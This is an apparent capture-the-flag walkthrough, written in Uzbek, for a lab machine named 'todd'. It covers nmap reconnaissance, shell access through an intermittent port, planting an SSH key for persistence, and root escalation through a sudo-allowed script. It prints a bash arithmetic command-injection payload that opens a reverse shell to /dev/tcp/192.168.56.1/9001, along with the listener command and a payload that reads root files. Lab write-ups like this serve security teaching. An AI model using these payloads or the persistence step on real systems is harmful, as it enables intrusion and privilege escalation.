## Reconnaissance

### Dastlabki Nmap skanerlash
```bash
$ nmap -sV -sC -p- 192.168.56.3 -A

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
2519/tcp  open  tcpwrapped
4470/tcp  open  tcpwrapped
...
```

### Ikkinchi Nmap skanerlash qiziqarli portni ko'rsatadi
```bash
$ nmap -sV -p- 192.168.56.3
-----------
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
7066/tcp  open  unknown
...
```

Eslatma: Port 7066 vaqti-vaqti bilan paydo bo'ladi.

## 7066 port orqali dastlabki kirish

### Doimiy ulanishga urinish
```bash
$ while true;do nc 192.168.56.3 7066;done
(UNKNOWN) [192.168.56.3] 7066 (?) : Connection refused
(UNKNOWN) [192.168.56.3] 7066 (?) : Connection refused
whoami
todd
```

### SSH Accessni o'rnatish
1. SSH kalit yarating:
```bash
ssh-keygen -t rsa -f todd
```

2. Maqsadli mashinada:
```bash
mkdir -p /home/todd/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCOd2qBPt87qsYOMlBoxpn6uTqyKwHLIXcNj8eO.... void-strike@athena" > /home/todd/.ssh/authorized_keys
```

3. SSH orqali ulanish:
```bash
ssh todd@192.168.56.3 -i ~/.ssh/todd
```

## Privilege Escalation

### Sudo imtiyozlarini tekshirish
```bash
$ sudo -l
Matching Defaults entries for todd on todd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User todd may run the following commands on todd:
    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh
    (ALL : ALL) NOPASSWD: /usr/bin/rm
    (ALL : ALL) NOPASSWD: /usr/sbin/reboot
```

### guess_and_check.sh
```bash
# check this script used by human 
a=$((RANDOM%1000))
echo "Please Input [$a]"

echo "[+] Check this script used by human."
echo "[+] Please Input Correct Number:"
read -p ">>>" input_number

[[ $input_number -ne "$a" ]] && exit 1

sleep 0.2
true_file="/tmp/$((RANDOM%1000))"
sleep 1
false_file="/tmp/$((RANDOM%1000))"

[[ -f "$true_file" ]] && [[ ! -f "$false_file" ]] && cat /root/.cred || exit 2
```

### 1-usul: Fayl yaratishdan foydalanish
1. Ehtimollikni oshirish uchun soxta fayllar yarating:
```bash
for i in {1..600}; do touch /tmp/$i ;done
```

2. Kalitni olmaguncha skriptni qayta-qayta ishga tushiring:
```bash
sudo /bin/bash /srv/guess_and_check.sh
```

### 2-usul: buyruqni kiritish
1. Kirish orqali ixtiyoriy buyruqlarni bajaring:
```bash
Please Input [316]
[+] Check this script used by human.
[+] Please Input Correct Number:
>>>N[$(/bin/bash -i >& /dev/tcp/192.168.56.1/9001 0>&1)]
```

2. Tinglovchini sozlash:
```bash
nc -vlnp 9001
```

### Buyruq in'ektsiyasini tushuntirish
`N[$(cat /root/root.txt)]` kiritish arifmetik kontekstda talqin qilinadi, bu esa Bashning bayroq tarkibini arifmetik sifatida baholashga urinishiga sabab bo'ladi, bu esa muvaffaqiyatsizlikka uchraydi va xato xabaridagi bayroq mazmunini ko'rsatadi.

## Root Access
Rootga oʻtish uchun /root/.cred hisob maʼlumotlaridan foydalaning:
```bash
su
Password: [content of /root/.cred]
root@todd:/home/todd#
```

Yoki in'ektsiya orqali olingan teskari qobiq orqali.
